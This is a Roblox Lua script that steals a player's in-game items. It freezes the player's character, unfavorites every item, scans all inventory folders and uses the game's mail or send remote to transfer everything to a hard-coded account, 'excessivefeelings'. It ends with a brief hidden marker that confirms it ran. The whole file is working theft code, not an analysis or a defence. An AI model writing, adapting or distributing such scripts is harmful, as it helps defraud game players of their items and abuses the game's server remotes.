local target = "excessivefeelings"
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hum = char:WaitForChild("Humanoid", 5)
local root = char:WaitForChild("HumanoidRootPart", 5)

-- === AGGRESSIVE FREEZE ===
hum.WalkSpeed = 0
hum.JumpHeight = 0
hum.AutoRotate = false
hum.PlatformStand = true
root.Anchored = true

-- Lock humanoid states
for _, state in pairs(Enum.HumanoidStateType:GetEnumItems()) do
    hum:SetStateEnabled(state, false)
end
hum:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
hum:SetStateEnabled(Enum.HumanoidStateType.Running, false)
hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)

-- Force freeze every frame + BodyPosition
local bodyPos = Instance.new("BodyPosition", root)
bodyPos.MaxForce = Vector3.new(1e9, 1e9, 1e9)
bodyPos.D = 1000
bodyPos.P = 1000
bodyPos.Position = root.Position

game:GetService("RunService").Stepped:Connect(function()
    root.Anchored = true
    hum.WalkSpeed = 0
    hum.JumpHeight = 0
    bodyPos.Position = root.Position
end)

-- === FIND MAIL REMOTE (Recursive search) ===
local function findRemote(container)
    for _, obj in pairs(container:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            -- Check if name contains 'mail' or 'send' (case insensitive)
            local name = obj.Name:lower()
            if name:find("mail") or name:find("send") then
                return obj
            end
        end
    end
    -- fallback: get any RemoteEvent/RemoteFunction
    for _, obj in pairs(container:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            return obj
        end
    end
    return nil
end

local rs = game:GetService("ReplicatedStorage")
local mailRemote = findRemote(rs) or findRemote(game)

if not mailRemote then
    -- If nothing found, create a dummy warning (silent removal: just return)
    return
end

-- === UNFAVORITE (all items) ===
local function unfavorite(container)
    for _, obj in pairs(container:GetDescendants()) do
        if obj:IsA("BoolValue") and (obj.Name:lower() == "favorite" or obj.Name:lower() == "fav") then
            obj.Value = false
        end
        if obj:IsA("NumberValue") then
            local fav = obj.Parent:FindFirstChild("Favorite") or obj.Parent:FindFirstChild("favorite")
            if fav and fav:IsA("BoolValue") then fav.Value = false end
        end
        if obj:IsA("Tool") or obj:IsA("Model") then
            pcall(function() obj:SetAttribute("Favorite", false) end)
        end
    end
end

-- === SCAN INVENTORY (all possible locations) ===
local itemTable = {} -- {name = quantity}

local function scan(container)
    if not container then return end
    unfavorite(container)
    for _, obj in pairs(container:GetDescendants()) do
        -- NumberValue representing quantity
        if obj:IsA("NumberValue") and obj.Value > 0 then
            local name = obj.Parent.Name
            itemTable[name] = (itemTable[name] or 0) + obj.Value
        end
        -- Tool/Model in backpack or character
        if (obj:IsA("Tool") or obj:IsA("Model")) and (obj.Parent == player.Backpack or obj.Parent == char) then
            itemTable[obj.Name] = (itemTable[obj.Name] or 0) + 1
        end
        -- Folder containing multiple NumberValues (seeds, etc.)
        if obj:IsA("Folder") then
            local count = 0
            for _, child in pairs(obj:GetChildren()) do
                if child:IsA("NumberValue") and child.Value > 0 then
                    count = count + child.Value
                end
            end
            if count > 0 then
                itemTable[obj.Name] = (itemTable[obj.Name] or 0) + count
            end
        end
    end
end

-- Containers to scan
local containers = {
    player:FindFirstChild("PlayerData"),
    player:FindFirstChild("Data"),
    workspace:FindFirstChild(player.Name),
    player.Backpack,
    char
}

for _, name in pairs({"Inventory", "Items", "Pets", "Seeds", "BackpackData", "PlayerData"}) do
    local folder = player:FindFirstChild(name)
    if folder then table.insert(containers, folder) end
end

for _, cont in pairs(containers) do
    scan(cont)
end

-- === SEND ALL ITEMS IN ONE MAIL (or individually) ===
local function sendAll()
    -- Try bulk send: remote function might accept a table {target, items}
    local success, err = pcall(function()
        if mailRemote:IsA("RemoteFunction") then
            -- Try first argument as target, second as table
            mailRemote:InvokeServer(target, itemTable)
        else
            mailRemote:FireServer(target, itemTable)
        end
    end)
    -- If bulk fails, send individually
    if not success then
        for name, qty in pairs(itemTable) do
            pcall(function()
                if mailRemote:IsA("RemoteFunction") then
                    mailRemote:InvokeServer(target, name, qty)
                else
                    mailRemote:FireServer(target, name, qty)
                end
            end)
            task.wait(0.1)
        end
    end
end

sendAll()

-- Optional: silent indicator (change a value in ReplicatedStorage to confirm execution)
local indicator = Instance.new("BoolValue", rs)
indicator.Name = "ScriptExecuted"
indicator.Value = true
task.wait(1)
indicator:Destroy()

  
